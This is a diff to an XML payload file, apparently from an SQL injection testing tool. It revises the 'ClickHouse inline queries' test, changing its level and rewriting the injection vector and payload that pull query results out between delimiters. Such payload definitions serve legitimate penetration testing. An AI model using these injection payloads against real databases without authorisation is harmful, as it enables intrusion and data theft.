@@ -135,21 +135,21 @@
     </test>
 
     <test>
-        <title>Clickhouse inline queries</title>
+        <title>ClickHouse inline queries</title>
         <stype>3</stype>
-        <level>2</level>
+        <level>3</level>
         <risk>1</risk>
         <clause>1,2,3,8</clause>
         <where>3</where>
-        <vector>(SELECT '[DELIMITER_START]'||CAST(([QUERY]), 'String')||'[DELIMITER_STOP]')</vector>
+        <vector>('[DELIMITER_START]'||CAST(([QUERY]) AS String)||'[DELIMITER_STOP]')</vector>
         <request>
-            <payload>(SELECT '[DELIMITER_START]'||CAST((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)), 'String')||'[DELIMITER_STOP]')</payload>
+            <payload>('[DELIMITER_START]'||(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)||'[DELIMITER_STOP]')</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
         </response>
         <details>
-            <dbms>Clickhouse</dbms>
+            <dbms>ClickHouse</dbms>
         </details>
     </test>
     
